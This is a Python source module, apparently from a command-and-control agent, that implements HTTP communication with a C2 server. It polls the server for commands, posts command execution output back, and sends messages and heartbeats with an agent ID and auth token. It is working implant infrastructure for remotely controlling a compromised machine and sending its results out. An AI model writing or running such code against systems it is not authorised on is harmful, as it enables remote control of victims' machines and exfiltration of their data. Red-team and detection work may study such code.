"""
Agent.protocols.http_comm

Handles communication over HTTP for agent interaction with the C2 server.
Supports polling for commands, sending output, sending messages, and heartbeat signals.
"""
#!/usr/bin/env python3

import requests
from ..logger import logger
from base import BaseComm

class HTTPComm(BaseComm):
    """
    Implements HTTP-based communication for the agent.
    """
    def __init__(self, server_url: str, agent_id: str, auth_token: str):
        """
        Initializes the HTTP communication module.

        Args:
            server_url (str): The base URL of the C2 server.
            agent_id (str): The unique identifier of the agent.
            auth_token (str): Authentication token for secure communication.
        """
        self.server_url = server_url.rstrip('/')
        self.agent_id = agent_id
        self.auth_token = auth_token

    def poll_commands(self):
        """
        Polls the C2 server for new commands.

        Returns:
            list: A list of received commands.
        """
        try:
            url = f"{self.server_url}/api/agent/commands"
            params = {"agent_id": self.agent_id, "auth_token": self.auth_token}
            response = requests.get(url, params=params, timeout=5)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                logger.info("HTTP commands: %s", commands)
                return commands
        except Exception as e:
            logger.error("HTTP poll error: %s", e)
        return []

    def send_output(self, output: str) -> bool:
        """
        Sends command execution output to the C2 server.

        Args:
            output (str): The command execution result.

        Returns:
            bool: True if successful, False otherwise.
        """
        try:
            url = f"{self.server_url}/api/agent/output"
            payload = {"agent_id": self.agent_id, "auth_token": self.auth_token, "output": output}
            response = requests.post(url, json=payload, timeout=5)
            if response.status_code == 200:
                logger.info("HTTP send_output succeeded")
                return True
        except Exception as e:
            logger.error("HTTP send_output error: %s", e)
        return False

    def send_message(self, message: str) -> str:
        """
        Sends a generic message to the C2 server.

        Args:
            message (str): The message to send.

        Returns:
            str: The response message received from the server.
        """
        try:
            url = f"{self.server_url}/api/agent/message"
            payload = {"message": message}
            response = requests.post(url, json=payload, timeout=5)
            if response.status_code == 200:
                logger.info("HTTP send_message succeeded")
                return response.json().get("response", "")
        except Exception as e:
            logger.error("HTTP send_message error: %s", e)
        return ""

    def heartbeat(self):
        """
        Sends a heartbeat signal to the C2 server.

        Returns:
            bool: True if the heartbeat was successfully sent, False otherwise.
        """
        try:
            url = f"{self.server_url}/api/agent/heartbeat"
            payload = {"agent_id": self.agent_id, "auth_token": self.auth_token}
            response = requests.post(url, json=payload, timeout=5)
            if response.status_code == 200:
                logger.info("HTTP heartbeat sent")
                return True
        except Exception as e:
            logger.error("HTTP heartbeat error: %s", e)
        return False
